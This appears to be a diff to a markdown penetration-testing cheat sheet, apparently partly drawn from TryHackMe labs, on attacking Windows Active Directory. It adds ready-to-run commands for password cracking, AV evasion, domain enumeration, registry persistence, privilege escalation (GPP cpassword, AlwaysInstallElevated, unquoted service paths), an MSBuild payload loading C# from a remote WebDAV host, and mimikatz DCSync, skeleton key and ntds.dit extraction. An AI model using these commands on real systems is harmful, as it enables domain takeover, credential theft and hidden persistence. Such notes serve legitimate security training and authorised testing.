@@ -160,6 +160,13 @@ nxe.exe -u "C:\usernames.txt" -p "C:\passwords.txt" -d domain.com --continue-on-
 # crack kerberos TGS-REP hash (output from GetUserSPNs.py) and append 4 digits to the passwords 
 hashcat -m 13100 -a 6 hashfile.txt passwordlist.txt ?d?d?d?d
 ```
+hash types can be found at: https://hashcat.net/wiki/doku.php?id=example_hashes
+
+useful hash modes (-m value):
+
+- NTLMv2-SSP: 5600
+- 
+
 </details>
 
 ## Initial Access
@@ -193,6 +200,15 @@ nxe.exe smb 10.140.13.3 -u username -p 'password' --rid-brute
 
 # list shares
 netexec smb 10.140.13.3 -u username -p 'password' --shares
+```
+</details>
+
+<details>
+<summary> runas </summary>
+
+``` powershell
+# (run this as administrator) launch a cmd shell that will execute all network communication with the injected credentials for authentication.
+runas.exe /netonly /user:domain.com\username cmd.exe
 ```
 </details>
 
@@ -339,7 +355,12 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LPORT 9871
 ```
 
-build.xml
+build.xml (without placing code on disk)
+``` xml
+<Code Type="Class" Language="cs" Source="\\19.21.28.12\webdav\calc.cs">
+```
+
+build.xml withshellcode
 ``` xml
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="Hello">
@@ -430,6 +451,23 @@ DefenderCheck.exe payload.exe
 ```
 </details>
 
+<details>
+<summary> chameleon </summary>
+
+``` powershell
+https://github.com/klezVirus/chameleon
+```
+</details>
+
+<details>
+<summary> Testing Windows Defender </summary>
+
+``` powershell
+# making modifications to a payload until it no longer triggers windows defender is another option. This tool will show the exact byte that triggered defender 
+DefenderCheck.exe payload.exe
+```
+</details>
+
 
 ## Situational Awareness
 <details>
@@ -458,10 +496,23 @@ find /home -name authorized_hosts -perm 2 2>dev/null
 
 ``` bat
 ipconfig /displaydns
+rem show local user accounts
 net users
+rem list all domain users
+net user /domain
+rem list all domain groups
+net group /domain
+rem show membership of a specific domain group 
+net group "groupname" /domain
+rem show password policy of the domain
+net accounts /domain
+rem show information about the logged in user
 net user username
+rem show accounts with a bad password count > 0
+Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
 net localgroup
 net localgroup administrators
+rem show information about a specific domain user
 net user user_name /domain
 rem firewall settings
 netsh firewall show state
@@ -470,8 +521,6 @@ rem show scheduled tasks
 schtasks /query /fo LIST /v
 rem show patch level 
 wmic qfe get Caption,Description,HotFixID,InstalledOn
-rem list all domain users
-net user /domain
 rem add a user
 net user logon_name password /add
 rem add user to local admins
@@ -486,6 +535,36 @@ dir /s *pass* == *cred* == *vnc* == *.config*
 rem use sysinternals adexplorer to fetch active directory information
 ADExplorer.exe 
 ```
+
+### Microsoft Management Console
+
+This native windows tool can be used in order to enumerate active directory. In order to install the software:
+1. Press Start
+2. Search "Apps & Features" and press enter
+3. Click Manage Optional Features
+4. Click Add a feature
+5. Search for "RSAT"
+6. Select "RSAT: Active Directory Domain Services and Lightweight Directory Tools" and click Install
+
+You can start MMC by using the Windows Start button, searching run, and typing in MMC
+
+(if running with runas on the attacker machine, you will need to configure the forrests. if running on a domain joined machine, some of this can be skipped.)
+
+In MMC, we can now attach the AD RSAT Snap-In:
+
+1. Click File -> Add/Remove Snap-in
+2. Select and Add all three Active Directory Snap-ins
+3. Click through any errors and warnings
+4. Right-click on Active Directory Domains and Trusts and select Change Forest
+5. Enter za.tryhackme.com as the Root domain and Click OK
+6. Right-click on Active Directory Sites and Services and select Change Forest
+7. Enter za.tryhackme.com as the Root domain and Click OK
+8. Right-click on Active Directory Users and Computers and select Change Domain
+9. Enter za.tryhackme.com as the Domain and Click OK
+10. Right-click on Active Directory Users and Computers in the left-hand pane
+11. Click on View -> Advanced Features
+
+If we had the relevant permissions, we could also use MMC to directly make changes to AD, such as changing the user's password or adding an account to a specific group.
 </details>
 
 <details>
@@ -528,8 +607,8 @@ seatbelt.exe UAC 'computername=10.140.12.13' -username=company\user -password=pa
 # using python tooling, remotely retreive AD information for loading into bloodhound
 bloodhound-python -d domain.com -u username -p password -c ALL -ns 10.10.192.2
 
-# using c# tooling, retreive AD infomation for loading into bloodhound
-sharphound.exe
+# using c# tooling (ps1 tooling also available), retreive AD infomation for loading into bloodhound and do not touch domian controllers (better for evasion)
+Sharphound.exe --CollectionMethods All --Domain domain.com --ExcludeDCs
 
 # start bloodhound application
 ./BloodHound
@@ -577,6 +656,17 @@ hashcat -m 5600 /tools/responder/logs/* /usr/share/rockyou.txt
 - add attacker ssh public key to authorized_keys file
 - create a scheduled task
 - create a WMI event consumer
+- add an executable/script to the windows startup folder
+- registry keys
+``` bat
+rem these keys are often used for persistence
+HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+rem cmd autorun - when cmd loads, it looks for registry variables to execute first
+HKCU\SOFTWARE\Microsoft\Command Processor\AutoRun
+rem HKCU Load - not used in modern windows but still supported
+HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
+```
 
 
 ## Privelege Escalation
@@ -593,28 +683,71 @@ hashcat -m 5600 /tools/responder/logs/* /usr/share/rockyou.txt
 <summary> windows </summary>
 
 1. [LOLBAS](https://lolbas-project.github.io/#)
+3. UAC Bypass (https://github.com/hfiref0x/UACME)
 2. Unquoted Service Paths
+``` bat
+rem find unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+3. services whose files you can overwrite
+3. DLL search order hijacking
 3. [winpeas](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
-4. preferences policy file. msft publishes the [AES key](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
-5. always install elevated registry setting
+4. group policy preferences file. msft publishes the [AES key](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
+``` powershell
+# find cpassword under the sysvol share in any xml file
+Get-ChildItem -Path "$env:LOGONSERVER\sysvol" -Filter *.xml -Recurse | Select-String "cpassword"
+```
+7. Recovering Credentials from a PXE Boot Image
+8. always install elevated registry setting
 ``` bat
 rem This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 ```
-5. unattended install files
+9. unattended install files
 ``` powershell
 # unattended install files typically in these locations
 c:\sysprep.inf
 c:\sysprep\sysprep.xml
+c:\windows\sysprep\sysprep.inf
+c:\windows\sysprep\sysprep.xml
+c:\windows\system32sysprep\Unattended.xml
 %WINDIR%\Panther\Unattend\Unattended.xml
 %WINDIR%\Panther\Unattended.xml
 ```
 </details>
 
 ## Domination
+
 <details>
-<summary> golden ticket </summary>
+<summary> DCSync </summary>
+
+``` bat
+rem using mimikatz, extract the krbtgt hash via replication using the Directory Replication Service Remote (DRSR) Protocol
+lsadump::dcsync /user:krbtgt
+```
+</details>
+
+<details>
+<summary> skeleton key </summary>
+
+``` bat
+rem using mimikatz, a skelton key can be loaded into memory on a domain controller that allows anyone to authenticate as any user in the domain with the password "mimikatz"
+privilege::debug
+misc::skeleton
+```
+</details>
+
+<details>
+<summary> extract ntds.dit oneliner </summary>
+
+``` bat
+ntdsutil "ac in ntds" "ifm" "cr fu c:\mybackup" q q
+```
+</details>
+
+<details>
+<summary> extract ntds.dit (to be used for golden ticket) </summary>
 
 target machine (domain controller):
 ``` bat
